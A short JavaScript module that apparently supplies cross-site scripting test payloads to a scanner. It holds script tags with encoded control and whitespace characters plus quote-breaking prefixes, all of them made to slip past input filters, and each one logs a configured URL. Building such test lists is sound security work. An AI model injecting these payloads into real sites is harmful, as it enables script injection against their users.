const config = require('./config.js');

module.exports = [
  `');console.log(${JSON.stringify(config.url)});//`,
  `<script\x20type="text/javascript">javascript:console.log(${JSON.stringify(config.url)});</script>`,
  `<script\x3Etype="text/javascript">javascript:console.log(${JSON.stringify(config.url)});</script>`,
  `<script\x0Dtype="text/javascript">javascript:console.log(${JSON.stringify(config.url)});</script>`,
  `<script\x09type="text/javascript">javascript:console.log(${JSON.stringify(config.url)});</script>`,
  `<script\x0Ctype="text/javascript">javascript:console.log(${JSON.stringify(config.url)});</script>`,
  `<script>console.log(${JSON.stringify(config.url)})</script>`,
  `<script\x2Ftype="text/javascript">javascript:console.log(${JSON.stringify(config.url)});</script>`,
  `<script\x0Atype="text/javascript">javascript:console.log(${JSON.stringify(config.url)});</script>`,
  `'\`"><\x3Cscript>javascript:console.log(${JSON.stringify(config.url)})</script>`,
  `'\`"><\x00script>javascript:console.log(${JSON.stringify(config.url)})</script>`,
];
